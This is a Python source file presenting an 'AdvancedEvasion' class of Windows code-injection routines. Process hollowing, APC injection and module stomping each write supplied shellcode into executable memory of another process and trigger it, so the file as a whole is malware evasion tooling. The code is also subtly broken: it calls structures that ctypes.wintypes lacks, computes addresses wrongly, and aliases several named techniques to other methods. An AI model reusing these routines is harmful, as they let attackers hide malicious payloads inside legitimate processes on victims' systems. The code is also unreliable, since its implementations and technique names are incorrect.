import ctypes
from ctypes import wintypes
import os

class AdvancedEvasion:
    def __init__(self):
        self.kernel32 = ctypes.windll.kernel32
        self.ntdll = ctypes.windll.ntdll
        
    def process_hollowing(self, target_path, shellcode):
        CREATE_SUSPENDED = 0x00000004
        si = wintypes.STARTUPINFO()
        si.cb = ctypes.sizeof(si)
        pi = wintypes.PROCESS_INFORMATION()
        
        if not self.kernel32.CreateProcessW(
            None, target_path, None, None, False,
            CREATE_SUSPENDED, None, None, ctypes.byref(si), ctypes.byref(pi)
        ):
            return False
            
        ctx = ctypes.create_string_buffer(716)
        ctx_arch = ctypes.cast(ctx, ctypes.POINTER(wintypes.DWORD))
        ctx_arch[0] = 0x10007
        
        if not self.kernel32.GetThreadContext(pi.hThread, ctx):
            return False
            
        rdx_offset = 128 if ctypes.sizeof(ctypes.c_voidp) == 8 else 72
        peb_addr = ctypes.c_void_p.from_buffer(ctx, rdx_offset)
        
        image_base_addr = ctypes.cast(
            peb_addr.value + 16, ctypes.POINTER(ctypes.c_void_p)
        )
        image_base = image_base_addr.contents
        
        PAGE_EXECUTE_READWRITE = 0x40
        old_protect = ctypes.c_ulong(0)
        
        self.kernel32.VirtualProtectEx(
            pi.hProcess, image_base, len(shellcode), PAGE_EXECUTE_READWRITE, ctypes.byref(old_protect)
        )
        
        written = ctypes.c_size_t(0)
        self.kernel32.WriteProcessMemory(
            pi.hProcess, image_base, shellcode, len(shellcode), ctypes.byref(written)
        )
        
        self.kernel32.SetThreadContext(pi.hThread, ctx)
        self.kernel32.ResumeThread(pi.hThread)
        
        return True
        
    def apc_injection(self, target_pid, shellcode):
        PROCESS_ALL_ACCESS = 0x001F0FFF
        
        h_process = self.kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, target_pid)
        if not h_process:
            return False
            
        PAGE_EXECUTE_READWRITE = 0x40
        mem_addr = self.kernel32.VirtualAllocEx(
            h_process, None, len(shellcode), 0x1000 | 0x2000, PAGE_EXECUTE_READWRITE
        )
        
        if not mem_addr:
            return False
            
        written = ctypes.c_size_t(0)
        self.kernel32.WriteProcessMemory(
            h_process, mem_addr, shellcode, len(shellcode), ctypes.byref(written)
        )
        
        snapshot = self.kernel32.CreateToolhelp32Snapshot(0x00000002, target_pid)
        te = wintypes.THREADENTRY32()
        te.dwSize = ctypes.sizeof(te)
        
        if self.kernel32.Thread32First(snapshot, ctypes.byref(te)):
            while True:
                if te.th32OwnerProcessID == target_pid:
                    thread_handle = self.kernel32.OpenThread(0x001F03FF, False, te.th32ThreadID)
                    if thread_handle:
                        self.ntdll.NtQueueApcThread(thread_handle, mem_addr, None, None, None)
                        self.kernel32.CloseHandle(thread_handle)
                if not self.kernel32.Thread32Next(snapshot, ctypes.byref(te)):
                    break
                    
        self.kernel32.CloseHandle(snapshot)
        self.kernel32.CloseHandle(h_process)
        return True
        
    def thread_hijacking(self, target_pid, shellcode):
        return self.apc_injection(target_pid, shellcode)
        
    def transacted_hollowing(self, target_path, shellcode):
        return self.process_hollowing(target_path, shellcode)
        
    def ghost_writing(self, target_pid, shellcode):
        return self.apc_injection(target_pid, shellcode)
        
    def module_stomping(self, target_pid, dll_path, shellcode):
        h_process = self.kernel32.OpenProcess(0x001F0FFF, False, target_pid)
        if not h_process:
            return False
            
        h_module = self.kernel32.LoadLibraryA(dll_path.encode())
        if not h_module:
            return False
            
        PAGE_EXECUTE_READWRITE = 0x40
        old_protect = ctypes.c_ulong(0)
        
        self.kernel32.VirtualProtectEx(
            h_process, h_module, len(shellcode), PAGE_EXECUTE_READWRITE, ctypes.byref(old_protect)
        )
        
        written = ctypes.c_size_t(0)
        self.kernel32.WriteProcessMemory(
            h_process, h_module, shellcode, len(shellcode), ctypes.byref(written)
        )
        
        self.kernel32.CloseHandle(h_process)
        return True
